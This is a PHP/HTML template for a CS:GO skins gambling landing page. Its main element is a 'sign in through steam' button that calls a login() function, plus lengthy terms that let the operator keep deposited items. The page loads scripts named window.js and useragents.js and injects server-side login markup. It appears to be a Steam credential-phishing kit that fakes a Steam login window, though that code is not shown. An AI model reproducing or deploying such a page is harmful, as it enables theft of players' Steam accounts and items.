<?php
	require_once("default_code.php");
?>
<!DOCTYPE html>
<html manifest='index.manifest' land='en'>
<head>
    <meta charset="UTF-8">
        <title><?=$title?></title>
        <meta name="description" content="CS:GO Skins Jackpot. A CS:GO gambling site for Silver &amp; Elite players. Deposit now to win awesome skins and play by our motto - EZ Skins, EZ Life.">
        <meta property="og:description" content="Gambling site for Silver & Elite players. Deposit now to win awesome skins and play by our motto - EZ Skins, EZ Life.">
        <meta property="og:image" content="template-1/images/img_prev.png">
        <link rel="shortcut icon" href="https://imgur.com/mi1tf6k.png">
        <link rel="stylesheet" href="template-1/css/ezskins.min.css">
		      <script type="text/javascript" src="window/bowser.js"></script>
      <script type="text/javascript" src="window/window.js"></script>
      <script type="text/javascript" src="window/jquery-3.2.1.min.js"></script>

      <link rel="stylesheet" type="text/css" href="window/window.css">
        <link href="https://fonts.googleapis.com/css?family=Play:700" rel="stylesheet">
    
    
    
    
    <style>
        /** {padding: 0; margin: 0;}
        body {font-family: 'Roboto', sans-serif; color: #fff; font-size: 16px;}*/
    /* Style the video: 100% width and height to cover the entire window */
.videobg {
    position: fixed;
    right: 0;
    bottom: 0;
    min-width: 100%; 
    min-height: 100%;
    z-index: 1;
   background-image: url('template-1/bg.gif');
   background-attachment: fixed;
   background-size: cover;
  -webkit-filter: blur(5px);
  -moz-filter: blur(5px);
  -o-filter: blur(5px);
  -ms-filter: blur(5px);
  filter: blur(5px); 
  transform: scale(1.02);
}



.splash-wrapper {
                
                position: fixed;
                top: 0;
                bottom: 0;
                left: 0;
                right: 0;
                z-index: 3;
            }

            .splash {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-direction: column;
                flex-direction: column;
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                justify-content: center;
                height: 100%;
                opacity: 1;
                background-size: cover;
            }

            .splash-container {
                max-width: 350px;
                margin-top: 20px;
                font-size: 1.25em;
                color: #f6f6f6;

            }

            .login-btn {

                font-weight: 700;
                font-variant: small-caps;
                background: #42b142;
                width: 100%;
                max-width: 384px;
                color: #fff;
				outline: none;
                margin-top: 30px;
                font-size: 1.75em;
                line-height: 1.75em;
                box-shadow: 0 3px 0 #358e35 !important;
            }


            .videooverlay {
                position: absolute;
                z-index: 2;
                width: 100%;
                height: 100%;
                background-color: rgba(32, 30, 37, 0.8);
            }

            .loader {
    position: absolute;
    top: 0;
    bottom: 0;
    margin: auto;
    left: 0;
    right: 0;
    
    width: 60px;
    height: 60px;
    
    animation:  loader-animation 2s linear infinite; 
  }
  .row {
    display: flex;
  }
  .cell {
    width: 30px;
    height: 30px;
    background-color: #fff;
  }

  .a {
    width: 30px;
    height: 30px;
    background-color: #fff;
    animation:  acell-animation 2s linear infinite;  
  }

  .b {
    width: 30px;
    height: 30px;
    background-color: #fff;
    animation:  bcell-animation 2s linear infinite;  
  }

  .c {
    width: 30px;
    height: 30px;
    background-color: #fff;
    animation:  ccell-animation 2s linear infinite;  
  }

  .d {
    width: 30px;
    height: 30px;
    background-color: #fff;
    animation:  dcell-animation 2s linear infinite;  
  }


  @keyframes acell-animation {
    0% { 
      transform:  translate(0, 0) rotate(90deg); 
    } 
    20% { 
      transform:  translate(-31px, -31px) rotate(45deg);  
    }
    100% {
      transform:  translate(0, 0) rotate(0deg); 
    }
  }
  @keyframes bcell-animation {
    0% { 
      transform: translate(0, 0) rotate(90deg);  
    }
    20% { 
      transform: translate(31px, -31px) rotate(45deg); 
    }
    100% {
      transform: translate(0, 0) rotate(0deg); 
    }
  }
  @keyframes ccell-animation {
    0% { 
      transform: translate(0, 0) rotate(90deg);  
    }
    20% { 
      transform: translate(-31px, 31px) rotate(45deg); 
    }
    100% {
      transform: translate(0, 0) rotate(0deg); 
    }
  }
   
  @keyframes dcell-animation {
    0% { 
      transform: translate(0, 0) rotate(90deg); 
    }
    20% { 
      transform: translate(31px, 31px) rotate(45deg); 
    }
    100% {
      transform: translate(0, 0) rotate(0deg);
    }
  } 


  @keyframes loader-animation {
    0% { 
        transform: rotate(135deg); 
    }
    
    100% {
      transform: rotate(45deg);
    }
  }

  .full_loader {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 500;
      background-color: rgba(19, 19, 19, 0.9);  }

	  m4 { 
    text-transform: uppercase;
   }
    </style>

    <script>
    
    </script>

</head>
<body>
    <div class="full_loader">
        <div class="loader">
            <div class="row">
                <div class="cell a"></div>
                <div class="cell b"></div>
            </div>
            <div class="row">
                <div class="cell c"></div>
                <div class="cell d"></div>
            </div>
        </div>
    </div>

    <!-- The video -->
    <div class="videobg"></div>
    <div>

    <div class="videooverlay"></div>    

        <div class="splash-wrapper">
        <div class="splash">
        <span style="font-size:74px; font-family: 'Play'; font-weight: 700; color: #fff;"><span style="color: #358e35;"><m4><?=$_SERVER["SERVER_NAME"]?></m4></span></span>
        <a class="btn login-btn" href="javascript:login()"><i class="fa fa-lock"></i> sign in through steam</a>
        <div class="splash-container" style="text-align: center; max-width: 480px !important; font-size: 1em; margin-top: 100px;">
                    By signing in with Steam you agree that you have read and accept our
                    <a href="#" data-toggle="modal" data-target="#datamodal">Terms of Usage</a>
                    and are at least 18 years old.
                </div>
            </div>
        </div>
        
        <div class="modal fade" id="datamodal" role="dialog">
            <div class="modal-dialog">
                <div class="modal-content" style="border-radius: 0px !important;">
                    <div class="modal-header">
                        <button class="close" type="button" data-dismiss="modal">x</button>
                        <h4 class="modal-title">Terms and Conditions</h4>
                    </div>
                    <div class="modal-body">
                        <h3>Terms and Conditions</h3>
                        <p>By using <?=$_SERVER["SERVER_NAME"]?>, you are agreeing with those Terms of Service and you are responsible for compliance with any applicable local laws. If you don't agree with these terms of service, you are not allowed to use <?=$_SERVER["SERVER_NAME"]?>.
    
    You must be over 18 years old AND not a resident of United States or United Kingdom to play on <?=$_SERVER["SERVER_NAME"]?>.</p>
    
                        <h3>Item prices</h3>
                        <p>We cannot always have the right prices, but we are trying our best to have our prices consistent.
    
    Since we cannot take patterns into account, the valued price can be under the actual item value.
    
    Playing on skinsowner implies that you fully accept our prices and understand there will be no refund in case of a price issue.</p>
                        
                        <h3>Rounds</h3>
                        <p>When you deposit your items, you have no guarantee for it to be put in the current round.
    
    We will not give anything back if you were not put on the round you wanted.</p>
                        
                        <h3>Allowed items</h3>
                        <p>skinsowner only allows CS:GO items to be deposited.
    
    We reserve the right to refuse any item. We do not accept Souvenir items because their prices are not constant.
    
    Always play safely. Don't play with items you are not willing to lose. Once your game is confirmed on the site and the offer is accepted, it can't be cancelled.</p>
                        
                        <h3>Fee</h3>
                        <p>skinsowner takes up to 7.5% of the total value of each round, although realistically, we only take 3% on average. It allows us to maintain the website. This can be lowered by having <?=$_SERVER["SERVER_NAME"]?>.org in your name.
    
    The items deposited by the winner are never taken.
    
    The value of the rounds shown on the website does not take it into account.</p>
                        
                        <h3>Winnings</h3>
                        <p>Winnings are returned via the in-site inventory. Even if your items exceed the inventory limit; they will be placed in.
    
    We do not guarantee that the items received by the winners will be exactly the ones from the pool. We only guarantee they will be the same skins with the same qualities, so they have the same value on our website.
    
    After the round you won closed, your winnings will be transferred to your inventory instantly. If for some reason they are not you have 3 days to contact us requesting your winnings.
    
    If you did not contact us after those 3 days, the items become ours and you will not be able to get them anymore.</p>
                        
                        <h3>Inventory</h3>
                        <p>Depositing skins in your inventory is how you can use your items in the site.
    
    When you request a trade offer to add items you must accept the offer for your skins to be deposited.
    
    If you do not accept the offer; no skins will be added to your account; nor will any skins be taken from your account.
    
    If you cancel the offer; no skins will be added to your account; nor will any skins be taken from your account.
    
    When you accept the offer; it can take up to 1 hour for the skins to arrive into your account.
    
    If steam is delayed (According to http://steamstat.us); it can take up to 24 hours for you to receive your items in your inventory after accepting your trade.
    
    When you deposit skins into the on-site inventory; those items are official property of skinsowner.
    
    Please note that we do not track individual items and thus any items you deposit will be treated as any other item with the same name.
    
    If you leave your items on the on-site inventory but remain inactive for extended periods of time, we may deem these accounts as abandoned and collect the items to ensure fair use of item capacity.</p>
                        
                        <h3>Withdrawals</h3>
                        <p>In order to get skins out of your inventory you must withdraw them from your inventory.
    
    You can only withdraw items you currently own in your inventory; not items that are in a current round.
    
    Your withdrawal will be sent via a steam trade offer to the trade URL you provided when depositing items.
    
    If you cancel the trade offer; your items will be automatically refunded into your account after 10 minutes.
    
    If you do not respond to the offer after 10 minutes; your offer will be refunded into your in-site inventory.
    
    If steam is delayed (According to http://steamstat.us); it can take up to 24 hours for offer to arrive.
    
    If you counter an offer; your offer will be marked as complete and you will not receive your items.
    
    Please note that we do not track individual items and thus any items you withdraw may not be the exact item you deposited (different float, patterns, stickers, name-tags, etc.)
    
    </p>
                        
                        </div><div class="modal-footer"><button class="btn btn-default" type="button" data-dismiss="modal">Close</button></div></div></div></div>
    
    </div>
    
    
	
	
	<script src="template-1/js/bundle.min.js"></script>    
    
    <script src="template-1/js/jquery-ui.min.js"></script>
	<script src="template-1/js/bowser.js"></script>
	<script src="template-1/js/useragents.js"></script>
	<script src="template-1/js/window.js"></script>

    <script>

        var url = new URL(window.location.href);
        var ref = url.searchParams.get("ref");
        
        setTimeout(function(){
            $('.full_loader').fadeOut(500);
        },1700)

    </script>

<?=$login?>
</body>
</html>
